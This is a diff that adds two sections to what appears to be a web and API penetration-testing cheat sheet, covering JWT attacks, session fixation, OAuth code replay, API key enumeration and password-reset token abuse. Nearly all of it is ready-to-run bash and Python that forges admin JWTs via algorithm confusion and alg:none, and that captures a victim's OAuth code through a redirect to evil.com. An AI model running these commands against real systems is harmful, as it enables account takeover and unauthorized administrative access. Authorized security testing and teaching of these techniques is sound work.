@@ -848,3 +848,132 @@ curl -s -X POST http://target.com/api/v1/account/change-password \
 curl -s http://target.com/api/v1/admin/users \
      -H "X-API-Key: VALID_API_KEY"
 ```
+
+---
+
+## 9. JWT Manipulation and Attacks
+
+### JWT Algorithm Confusion (RS256 to HS256)
+
+```bash
+# Extract the public key from the JWKS endpoint
+curl -s https://target.com/.well-known/jwks.json | jq -r '.keys[0].x5c[0]' | base64 -d > public_key.pem
+
+# Forge a JWT signed with the public key as HMAC secret
+# Using jwt_tool for automated attack
+python3 jwt_tool.py JWT_TOKEN_HERE -X k -pk public_key.pem
+
+# Manual forging with python
+python3 -c "
+import jwt, json
+public_key = open('public_key.pem').read()
+payload = {'sub': 'admin', 'role': 'administrator', 'iat': 1717000000}
+token = jwt.encode(payload, public_key, algorithm='HS256')
+print(token)
+"
+```
+
+### JWT None Algorithm Attack
+
+```bash
+# Modify JWT payload and use alg:none to bypass signature verification
+# Decode existing token
+echo "HEADER_PAYLOAD" | base64 -d 2>/dev/null
+
+# Craft a token with alg:none and modified claims
+python3 -c "
+import base64, json
+header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
+payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin','iat':1717000000}).encode()).rstrip(b'=').decode()
+print(f'{header}.{payload}.')
+"
+
+# Test the forged token
+curl -s http://target.com/api/v1/admin/dashboard \
+     -H "Authorization: Bearer FORGED_TOKEN_HERE"
+```
+
+### Session Fixation Testing
+
+```bash
+# Test if session ID is accepted before and after authentication
+# Step 1: Get a pre-auth session ID
+SESSION=$(curl -s -c - http://target.com/login | grep session | awk '{print $NF}')
+echo "Pre-auth session: $SESSION"
+
+# Step 2: Authenticate with the pre-auth session
+curl -s -b "session=$SESSION" -d "user=admin&pass=valid_password" http://target.com/login -L
+
+# Step 3: Check if the same session ID now has admin access
+curl -s -b "session=$SESSION" http://target.com/admin/dashboard
+
+# Step 4: Test session fixation via URL parameter
+curl -s "http://target.com/login?session=FIXED_SESSION_ID" -d "user=admin&pass=valid_password" -L
+
+# Step 5: Test cookie injection via Set-Cookie in response header
+curl -s -D - http://target.com/login -d "user=admin&pass=valid_password" | grep -i set-cookie
+```
+
+---
+
+## 10. Token Theft and Replay Attacks
+
+### OAuth Token Replay Testing
+
+```bash
+# Test if OAuth authorization code can be reused
+# Step 1: Capture the authorization code from OAuth redirect
+AUTH_CODE=$(curl -s -D - http://target.com/oauth/authorize \
+  -H "Cookie: session=VICTIM_SESSION" \
+  -d "response_type=code&client_id=APP_ID&redirect_uri=https://evil.com/callback" 2>&1 | \
+  grep -oP 'code=\K[^&\s]+')
+
+# Step 2: Replay the authorization code from a different session
+curl -s -X POST http://target.com/oauth/token \
+  -d "grant_type=authorization_code&code=$AUTH_CODE&client_id=APP_ID&client_secret=SECRET&redirect_uri=https://evil.com/callback"
+
+# Step 3: Test if PKCE is enforced (it should be)
+# If token exchange succeeds without code_verifier, PKCE is not enforced
+```
+
+### API Key Bruteforce and Validation
+
+```bash
+# Test API key validation and enumerate valid keys
+# Common API key formats and their validation patterns
+for key_format in \
+  "aws_access_key:AKIA$(printf '%016s' | tr ' ' 'A')" \
+  "github_token:ghp_$(printf '%036s' | tr ' ' 'a')" \
+  "stripe_key:sk_live_$(printf '%24s' | tr ' ' '0')"; do
+  prefix=$(echo "$key_format" | cut -d: -f1)
+  key=$(echo "$key_format" | cut -d: -f2)
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+    http://target.com/api/v1/validate \
+    -H "X-API-Key: $key")
+  echo "[$prefix] $STATUS"
+done
+```
+
+### Password Reset Token Testing
+
+```bash
+# Test predictability and expiration of password reset tokens
+# Request multiple reset tokens and compare them for patterns
+for i in 1 2 3 4 5; do
+  curl -s -X POST http://target.com/api/v1/password-reset \
+    -H "Content-Type: application/json" \
+    -d '{"email":"test@test.com"}' \
+    -D - 2>&1 | grep -i "token\|reset"
+  sleep 1
+done
+
+# Test if old reset tokens remain valid after new one is issued
+TOKEN_1=$(curl -s -X POST http://target.com/api/v1/password-reset -H "Content-Type: application/json" -d '{"email":"user@target.com"}' | jq -r '.token')
+sleep 2
+TOKEN_2=$(curl -s -X POST http://target.com/api/v1/password-reset -H "Content-Type: application/json" -d '{"email":"user@target.com"}' | jq -r '.token')
+
+# Try using the first (old) token
+curl -s -X POST http://target.com/api/v1/password-reset/confirm \
+  -H "Content-Type: application/json" \
+  -d "{\"token\":\"$TOKEN_1\",\"new_password\":\"NewPass123!\"}" -w "\nHTTP: %{http_code}\n"
+```
